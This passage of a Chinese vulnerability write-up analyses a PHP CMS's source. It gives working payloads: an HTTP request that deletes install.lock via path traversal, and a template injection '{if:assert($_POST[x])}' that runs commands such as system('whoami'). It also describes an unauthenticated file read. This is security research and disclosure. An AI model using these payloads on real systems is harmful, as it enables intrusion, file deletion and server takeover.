+   <span class="nv">$tplfile</span> <span class="o">=</span> <span class="nx">SITE_DIR</span> <span class="o">.</span> <span class="nx">conf</span><span class="p">(</span> <span class="s1">&#39;adminpath&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;template/&#39;</span> <span class="o">.</span> <span class="nv">$module</span> <span class="o">.</span> <span class="s1">&#39;.tpl&#39;</span><span class="p">;</span>
+   <span class="nv">$cachefile</span> <span class="o">=</span> <span class="nx">RUN_DIR</span> <span class="o">.</span> <span class="s1">&#39;cache/&#39;</span> <span class="o">.</span> <span class="nx">conf</span><span class="p">(</span> <span class="s1">&#39;adminpath&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span> <span class="nv">$module</span> <span class="o">.</span> <span class="nv">$tpltype</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.tpl&#39;</span><span class="p">;</span>
+   <span class="c1">//echop ($tplfile);echop ($cachefile);
+</span><span class="c1"></span>   <span class="c1">//echop( template_parse(load_file($tplfile)));
+</span><span class="c1"></span>   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">is_file</span><span class="p">(</span> <span class="nv">$cachefile</span> <span class="p">)</span> <span class="o">||</span> <span class="nx">time_file</span><span class="p">(</span> <span class="nv">$tplfile</span> <span class="p">)</span> <span class="o">&gt;</span> <span class="nx">time_file</span><span class="p">(</span> <span class="nv">$cachefile</span> <span class="p">)</span> <span class="o">||</span> <span class="nx">size_file</span><span class="p">(</span> <span class="nv">$tplfile</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nx">create_file</span><span class="p">(</span> <span class="nv">$cachefile</span><span class="p">,</span> <span class="nx">template_parse</span><span class="p">(</span> <span class="nx">load_file</span><span class="p">(</span> <span class="nv">$tplfile</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$cachefile</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>后面会走到缓存文件的26行,<code>load_file</code>加载文件，网站的根目录和刚才传入的<code>type</code>也就是我们的路径</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">load_file</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;DOCUMENT_ROOT&#39;</span><span class="p">]</span><span class="o">.</span><span class="nx">G</span><span class="p">(</span><span class="s1">&#39;type&#39;</span><span class="p">));</span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><code>inc/zzz_file.php</code>的<code>load_file</code>函数，这里做了一个替换，不过没什么卵用，判断是否是文件就直接读取内容了。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">load_file</span><span class="p">(</span> <span class="nv">$path</span><span class="p">,</span> <span class="nv">$location</span> <span class="o">=</span> <span class="k">NULL</span> <span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$path</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;//&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$path</span> <span class="p">);</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nx">is_file</span><span class="p">(</span> <span class="nv">$path</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span> <span class="nv">$path</span> <span class="p">);</span>
+   <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="o">!</span><span class="nx">is_null</span><span class="p">(</span> <span class="nv">$location</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$locationpath</span> <span class="o">=</span> <span class="nx">PLUG_DIR</span> <span class="o">.</span> <span class="s1">&#39;template/&#39;</span> <span class="o">.</span> <span class="nv">$location</span> <span class="o">.</span> <span class="s1">&#39;.tpl&#39;</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="nx">is_file</span><span class="p">(</span> <span class="nv">$locationpath</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+         <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span> <span class="nv">$locationpath</span> <span class="p">);</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+         <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span> <span class="s1">&#39;REQUEST_URI&#39;</span> <span class="p">];</span>
+         <span class="nv">$url</span> <span class="o">=</span> <span class="nx">sub_left</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">);</span>
+         <span class="nx">phpgo</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
+         <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+      <span class="p">}</span>
+   <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nx">is_file</span><span class="p">(</span> <span class="nx">SITE_DIR</span> <span class="o">.</span> <span class="nv">$path</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span> <span class="nx">SITE_DIR</span> <span class="o">.</span> <span class="nv">$path</span> <span class="p">);</span>
+   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">error</span><span class="p">(</span> <span class="s2">&#34;载入文件失败,请检查文件路径！,&#34;</span> <span class="o">.</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">DOC_PATH</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$path</span> <span class="p">)</span> <span class="p">);</span>
+      <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>读取网站之外的文件</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/6.png" alt=""></p>
+<p><strong>为什么没有登录后台也能利用这个漏洞呢？</strong></p>
+<p>先在<code>admin155/index.php</code>里面包含<code>inc/zzz_admin.php</code>文件，但是这个<code>inc/zzz_admin.php</code>文件判断后没有用<code>exit()</code>这类的函数，导致程序继续往下走，又会回到<code>admin155/index.php</code>执行67行的内容，导致出现了可以不用登录后台也能读取任意文件。</p>
+<h1 id="0x04-任意文件删除漏洞">0x04 任意文件删除漏洞</h1>
+<h2 id="漏洞复现-2">漏洞复现</h2>
+<p>Payload:</p>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/admin155/save.php?act=delfile</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1/admin155/?module=uploadlist&amp;type=&amp;folder=product</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="n">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">30</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1; zzz_adminpath=0; zzz_adminface=..%2Fplugins%2Fface%2Fface1.png; zzz_adminname=admin; XDEBUG_SESSION=PHPSTORM</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+
+path=/upload/..//install/install.lock
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/7.png" alt=""></p>
+<h2 id="漏洞分析-2">漏洞分析</h2>
+<p>这个漏洞也是在后台做一些删除操作的时候发现的，开始的时候限制了目录，程序里面做了安全目录的限制，但是还是可以通过一些手段去绕过的。</p>
+<p>根据我们的paylaod可以看到<code>admin155/save.php</code>的文件，<code>delfile()</code>函数，这里从post方式获取到路径，这里做了一个限制的数组<code>$safe_path</code>,通过<code>arr_search</code>函数来寻找是否匹配。如果存在的话就传递给<code>del_file</code>函数。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">delfile</span><span class="p">(){</span>
+   <span class="nv">$file</span><span class="o">=</span><span class="nx">getform</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">,</span><span class="s1">&#39;post&#39;</span><span class="p">);</span>     
+    <span class="nv">$file_path</span><span class="o">=</span><span class="nx">file_path</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+    <span class="nv">$safe_path</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;upload&#39;</span><span class="p">,</span><span class="s1">&#39;template&#39;</span><span class="p">,</span><span class="s1">&#39;runtime&#39;</span><span class="p">,</span><span class="s1">&#39;backup&#39;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">arr_search</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">,</span><span class="nv">$safe_path</span><span class="p">)){</span>
+        <span class="nv">$file</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;DOCUMENT_ROOT&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$file</span><span class="p">;</span> 
+        <span class="k">return</span> <span class="nx">del_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>比较数组</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// 比较两个数组，是否有重复，重复则返回true
+</span><span class="c1"></span><span class="k">function</span> <span class="nf">arr_search</span><span class="p">(</span><span class="nv">$arr1</span><span class="p">,</span> <span class="nv">$arr2</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$result</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$arr1</span> <span class="k">as</span> <span class="nv">$v</span> <span class="p">)</span> <span class="p">{</span>
+       <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span> <span class="nv">$v</span><span class="p">,</span><span class="nv">$arr2</span> <span class="p">))</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>        
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>但是这里做了后缀的限制，后缀一定不能是<code>'php', 'db', 'mdb', 'tpl' </code>类型</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">del_file</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">{</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nx">is_null</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
+   <span class="nv">$file</span> <span class="o">=</span> <span class="nx">is_file</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$file</span> <span class="o">:</span> <span class="nv">$_SERVER</span><span class="p">[</span> <span class="s1">&#39;DOCUMENT_ROOT&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nx">is_file</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">ifstrin</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;runtime&#39;</span><span class="p">)){</span>
+            <span class="nx">unlink</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">file_ext</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="nx">in_array</span><span class="p">(</span> <span class="nv">$ext</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;db&#39;</span><span class="p">,</span> <span class="s1">&#39;mdb&#39;</span><span class="p">,</span> <span class="s1">&#39;tpl&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">unlink</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nx">rename</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="nx">randname</span><span class="p">()</span> <span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>但是我们能删除<code>install.lock</code>之类的文件，删除这个安装文件就可以重新安装程序，然后远程写入配置文件的方法把我们的恶意语句写进配置文件中去，参考文章https://getpass.cn/MIPCMS%20V3.1.0%20Remotely%20Writing%20the%20Configuration%20File%20Getshell/ ，但是这个程序不行，他的大部分get、post都是经过<code>getform</code>函数的，这个函数里面用了一个<code>txt_html</code>转换来过滤掉我们的字符</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">getform</span><span class="p">(</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$source</span> <span class="o">=</span> <span class="s1">&#39;both&#39;</span><span class="p">,</span> <span class="nv">$type</span> <span class="o">=</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">NULL</span> <span class="p">)</span> <span class="p">{</span>
+   <span class="k">switch</span> <span class="p">(</span> <span class="nv">$source</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">case</span> <span class="s1">&#39;post&#39;</span><span class="o">:</span>
+         <span class="nv">$data</span> <span class="o">=</span> <span class="nx">_POST</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">);</span>
+         <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="s1">&#39;get&#39;</span><span class="o">:</span>
+         <span class="nv">$data</span> <span class="o">=</span> <span class="nx">_GET</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">);</span>
+         <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="s1">&#39;both&#39;</span><span class="o">:</span>
+         <span class="nv">$data</span> <span class="o">=</span> <span class="nx">_POST</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">)</span> <span class="o">?</span> <span class="o">:</span> <span class="nx">_GET</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">);</span>
+         <span class="k">break</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">is_null</span><span class="p">(</span> <span class="nv">$type</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">ifch</span><span class="p">(</span><span class="nv">$default</span><span class="p">)){</span>
+            <span class="nv">$err</span> <span class="o">=</span> <span class="nx">checkstr</span><span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$type</span><span class="p">,</span> <span class="nv">$default</span> <span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="nv">$err</span> <span class="o">=</span> <span class="nx">checkstr</span><span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$type</span><span class="p">,</span> <span class="nv">$name</span> <span class="p">);</span>
+        <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="nv">$err</span><span class="p">[</span> <span class="s1">&#39;code&#39;</span> <span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">){</span>
+         <span class="k">if</span> <span class="p">(</span> <span class="nv">$default</span> <span class="o">==</span> <span class="s1">&#39;layer&#39;</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nx">layererr</span><span class="p">(</span> <span class="nv">$err</span><span class="p">[</span> <span class="s1">&#39;err&#39;</span> <span class="p">]</span> <span class="p">);</span>
+         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">back</span><span class="p">(</span> <span class="nv">$err</span><span class="p">[</span> <span class="s1">&#39;err&#39;</span> <span class="p">]</span> <span class="p">);</span>
+         <span class="p">}</span>
+        <span class="p">}</span>  
+   <span class="p">}</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">is_null</span><span class="p">(</span> <span class="nv">$default</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">ifch</span><span class="p">(</span> <span class="nv">$default</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$data</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$data</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$default</span> <span class="o">:</span> <span class="nv">$data</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nx">txt_html</span><span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p><code>txt_html</code>虽然说这个能作为防御，但是也影响了程序模板部分的功能，等会getshell的时候会分析到。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// txt 转换到 html
+</span><span class="c1"></span><span class="k">function</span> <span class="nf">txt_html</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">)</span> <span class="p">{</span>    
+   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nv">$s</span> <span class="p">)</span> <span class="k">return</span> <span class="nv">$s</span><span class="p">;</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">// 数组处理
+</span><span class="c1"></span>      <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$s</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span> <span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$string</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">=</span> <span class="nx">txt_html</span><span class="p">(</span> <span class="nv">$value</span> <span class="p">);</span>
+      <span class="p">}</span>
+   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span>  <span class="nv">$s</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>        
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="c1">//array(&#34;&#39;&#34;=&gt;&#34;&amp;apos;&#34;,&#39;&#34;&#39;=&gt;&#34;&amp;quot;&#34;,&#39;&lt;&#39;=&gt; &#34;&amp;lt;&#34;,&#39;&gt;&#39;=&gt; &#34;&amp;gt;&#34;);     
+</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span> <span class="nx">DB_TYPE</span> <span class="o">==</span> <span class="s1">&#39;access&#39;</span> <span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$s</span><span class="o">=</span> <span class="nx">toutf</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;&amp;apos;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;&amp;quot;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&amp;lt;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&amp;gt;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">htmlspecialchars</span><span class="p">(</span> <span class="nv">$s</span><span class="p">,</span><span class="nx">ENT_QUOTES</span><span class="p">,</span><span class="s1">&#39;UTF-8&#39;</span> <span class="p">);</span>       
+      <span class="p">}</span>            
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\t</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>     
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/script/i&#39;</span><span class="p">,</span> <span class="s1">&#39;scr1pt&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/＼.php/i&#39;</span><span class="p">,</span> <span class="s1">&#39;．php&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/ascii/i&#39;</span><span class="p">,</span> <span class="s1">&#39;asc11&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/eval/i&#39;</span> <span class="p">,</span> <span class="s1">&#39;eva1&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;┠&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;┼&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$s</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><h1 id="0x05-任意代码执行漏洞getshell-">0x05 任意代码执行漏洞（Getshell ）</h1>
+<h2 id="漏洞复现-3">漏洞复现</h2>
+<p>这个漏洞有点类似于seacms的那个前台getshell，但是这个是要在后台修改模板文件才可执行。</p>
+<p>1.登录后台，找到模板管理，电脑模板</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/8.png" alt=""></p>
+<ol start="2">
+<li>
+<p>随便找一个文件，比如我用<code> brandlist.html</code>,点击编辑,加入我们的payload</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">{if:assert($_POST[x])}xxx{end if}
+</code></pre></div></li>
+</ol>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/9.png" alt=""></p>
+<ol start="3">
+<li>
+<p>保存后打开我们编辑的页面，post的内容<code>x=phpinfo();</code>或者<code>x=system('whoami')</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/10.png" alt=""></p>
+</li>
+</ol>
+<h2 id="heading"></h2>
+<h2 id="漏洞分析-3">漏洞分析</h2>
+<p>首先我们可以用seay的代码审计工具去搜索关键字执行，这个我先用了phpstorm的搜索功能找到一个<code>eval</code>的执行函数，然后逆过来看下从哪里可以执行这个函数，看到了在模板文件的替换函数里面</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/11.png" alt=""></p>
+<p>我们直接定位到if替换的地方<code>inc/zzz_template.php</code>文件的<code>parserCommom</code>函数，可以进<code>parserIfLabel</code>函数一看究竟。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span>
+<span class="k">function</span> <span class="nf">parserCommom</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserSiteLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 站点标签
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ParseInTemplate</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 模板标签
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserConfigLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">//配置表情
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserSiteLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 站点标签
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserCompanyLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 公司标签
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserlocation</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 站点标签
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserLoopLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 循环标签
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserContentLoop</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 指定内容
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserbrandloop</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span>
+   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserGbookList</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span>
+   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserUser</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">//会员信息
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 指定内容
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserPicsLoop</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// 内容多图
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserad</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span>
